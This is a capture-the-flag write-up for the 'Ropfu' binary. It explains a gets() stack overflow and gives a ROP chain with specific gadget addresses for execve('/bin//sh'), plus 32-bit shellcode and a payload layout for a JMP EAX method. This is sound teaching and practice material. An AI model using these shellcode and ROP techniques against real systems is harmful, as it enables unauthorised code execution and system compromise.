# Ropfu Binary Exploitation CTF

## Overview

Target Binary:	```vuln```
Source Code:	```vuln.c```

### Protection (checksec)
	* Partial RELRO
	* NO PIE
	* Executable Stack
	* RWX Segments
	* Not stripped
	* Stack canary reported

### Goal

Execute arbitrary code to spawn a shell and recover the flag.

## Vulnerability Analysis

The ```vuln()``` function creates a small buffer on the stack and insecurely reads data into it using
```gets()```.  This will read data into a buffer from STDIN until reaching EOF allowing an overflow.

```c
void vuln() {
	char buf[16];
	printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
	return gets(buf);
}
```

Looking into the disassembly for ```vuln()```, the ```gets()``` call reads data into ```EBP-0x18```.  A total of 
28 bytes will need to be written before overflowing into the return address.  Although checksec reports the presence of a stack
canary, analysis of the vuln() function shows it is not actually used allowing a buffer overflow to succeed.

## Attack Paths

Since the binary has fixed addresses, executable memory, and a controllable return address, multiple exploitation strategies are viable:

1. A ROP-based syscall where a ROP chain is used to execute ```execve("/bin//sh", 0x00, 0x00)``` and spawn a shell
2. Direct shellcode execution using a ```JMP EAX``` instruction to redirect execution to ```buf```

## ROP Exploitation

Executing a ```execve("/bin//sh", 0x00, 0x00)``` syscall requires the following register values.

|Register|Value|
|---|---|
|```EAX```|0x0b|
|```EBX```|pointer to "/bin//sh"|
|```ECX```|0x00|
|```EDX```|0x00|

### Gadgets

ROPgadget was used to extract a complete list of gadgets.  The following are all that is needed to spawn a shell.

```
0x080b073a pop eax ; ret
0x0809e5c8 mov dword ptr [eax], edx ; ret
0x080583b9 pop edx ; pop ebx ; ret
0x08049e29 pop ecx ; ret
0x0804a3c2 int 0x80
```

There is also a writable address.
```
0x80e62c8
```

### ROP Chain Construction

The exploit proceeds in three stages:

#### 1. Writing "/bin//sh" into memory

A write-what-where primitive is constructed using the following gadgets:

- `pop eax ; ret` load destination address
- `pop edx ; pop ebx ; ret` load data (edx)
- `mov [eax], edx ; ret` write data

Using these, the string "/bin//sh\x00" is written into a writable memory region (`0x80e62c8`) in 4-byte chunks.

#### 2. Register Setup

To invoke `execve`, the registers must be set as follows:

- `eax = 0x0b` (syscall number)  
- `ebx = pointer to "/bin//sh"`  
- `ecx = pointer to NULL`  
- `edx = pointer to NULL`  

This is achieved using:

- `pop eax ; ret`  
- `pop edx ; pop ebx ; ret`  
- `pop ecx ; ret`  


#### 3. Syscall Execution

Finally, the syscall is triggered using:

- `int 0x80`

This results in execution of `execve("/bin//sh", NULL, NULL)` and spawns a shell.

## JMP EAX Method

Since the stack is executable and there are JMP EAX gadgets it is also possible to directly execute user inputted shellcode
The ```JMP EAX``` gadget is located at ```0x805333b```

Shellcode
```asm
BITS 32
ADD AL, 0x0e
XOR EDX, EDX
XOR ECX, ECX
MOV EBX, EAX
XOR EAX, EAX
MOV AL, 0x0b
INT 0x80
```

The final payload layout is
```
[shellcode]
"/bin/sh\x00"
[padding]
[JMP EAX]
```

This method is more compact, requiring only enough input to overwrite the return address.
